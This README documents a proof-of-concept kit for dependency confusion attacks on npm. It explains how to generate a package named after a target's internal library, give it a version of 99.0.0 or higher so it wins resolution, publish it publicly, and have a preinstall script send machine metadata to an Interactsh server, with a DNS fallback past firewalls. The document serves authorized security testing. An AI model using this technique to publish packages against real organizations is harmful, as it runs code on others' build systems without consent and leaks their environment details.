# Dependency Confusion PoC

**Author:** OFJAAAH

This directory contains a complete Proof of Concept (PoC) for demonstrating dependency confusion vulnerabilities.

## Components

```
poc/
├── test-site/           # Vulnerable demo website
│   ├── index.html       # Demo page with fake internal packages
│   └── package.json     # Simulated package.json with vulnerabilities
│
└── poc-package/         # npm package template
    ├── package.json     # Package template
    ├── callback.js      # Callback script (runs on npm install)
    ├── index.js         # Placeholder module
    └── generate-poc.sh  # Script to generate PoC for specific package
```

## Quick Start

### 1. Setup Interactsh (Callback Monitor)

**Option A: Use the Extension (Recommended)**

1. Open the extension options page
2. Enable "Interactsh" in the settings
3. Copy the generated URL

**Option B: Use interactsh-client**

```bash
# Install
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Run
interactsh-client
```

Copy the generated URL (e.g., `https://abc123xyz.oast.fun`)

### 2. Generate PoC Package

```bash
cd poc/poc-package

# Generate package for a specific vulnerable dependency
./generate-poc.sh "vulncorp-internal-lib" "https://YOUR_INTERACTSH_URL"

# The package will be created in ./output/vulncorp-internal-lib/
```

### 3. Publish to npm (Authorized Testing Only!)

```bash
cd output/vulncorp-internal-lib

# Login to npm
npm login

# Publish
npm publish

# To unpublish after testing (within 72 hours)
npm unpublish vulncorp-internal-lib --force
```

### 4. Monitor Callbacks

- Open the extension
- Check the Interactsh panel for incoming callbacks
- Discord notifications will be sent if configured

## Test Site

The `test-site/` directory contains a demo website that simulates a vulnerable application:

```bash
# Serve the test site locally
cd poc/test-site
python3 -m http.server 8080

# Or with Node.js
npx serve .
```

Then:
1. Open http://localhost:8080 in your browser
2. The Dependency Confusion Hunter extension will detect the fake packages
3. They should appear in the findings list

## Package Callback Flow

```
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  Target CI/CD   │     │   npm Registry  │     │   Interactsh    │
│                 │     │                 │     │     Server      │
└────────┬────────┘     └────────┬────────┘     └────────┬────────┘
         │                       │                       │
         │ 1. npm install        │                       │
         │──────────────────────>│                       │
         │                       │                       │
         │ 2. Returns PoC pkg    │                       │
         │<──────────────────────│                       │
         │                       │                       │
         │ 3. preinstall runs    │                       │
         │ callback.js           │                       │
         │───────────────────────────────────────────────>
         │                       │                       │
         │                       │     4. Callback with  │
         │                       │        metadata       │
         │                       │                       │
         │                       │                       │
    ┌────┴────────────────────────────────────────┐     │
    │              Extension                       │     │
    │  5. Poll Interactsh for interactions        │<────┘
    │  6. Display callback in UI                  │
    │  7. Send Discord notification               │
    └─────────────────────────────────────────────┘
```

## Callback Data Collected

The PoC package only collects **non-sensitive metadata**:

| Field | Description |
|-------|-------------|
| `package` | Name of the installed package |
| `hostname` | Machine hostname |
| `platform` | OS platform (linux, darwin, win32) |
| `arch` | CPU architecture |
| `nodeVersion` | Node.js version |
| `timestamp` | Installation time |
| `isCI` | Whether running in CI environment |
| `cwd` | Working directory (last 2 path segments only) |

**No credentials, tokens, or sensitive data are collected.**

## Safety Notes

1. **Only test against systems you have authorization to test**
2. **Unpublish PoC packages after testing** (within npm's 72-hour window)
3. **Use a dedicated npm account** for security research
4. **Document your testing** for responsible disclosure

## Customization

### Custom Callback URL

Edit `callback.js` and set `CALLBACK_URL`:

```javascript
const CALLBACK_URL = 'https://your-server.com/callback';
```

### DNS-only Callback

For environments that block HTTP, the callback will automatically fall back to DNS:

```javascript
// DNS query: encoded-data.your-interactsh-url.oast.fun
```

### Custom Package Version

Use version `99.0.0` or higher to ensure npm prefers your package over any existing private package.

## Troubleshooting

### Package not being installed

- Ensure the package name matches exactly (case-sensitive)
- Check `.npmrc` for registry configuration
- Version must be higher than private registry version

### Callback not received

- Check firewall allows outbound HTTPS
- Try DNS-based callback (works even with restrictive firewalls)
- Verify Interactsh URL is correct

### Extension not detecting packages

- Ensure extension is enabled
- Check that the domain isn't in the ignored list
- Verify package.json is accessible

## Legal Disclaimer

This tool is for **authorized security testing only**. Using this tool against systems without explicit permission is illegal and unethical.

The author (OFJAAAH) is not responsible for any misuse of this tool.
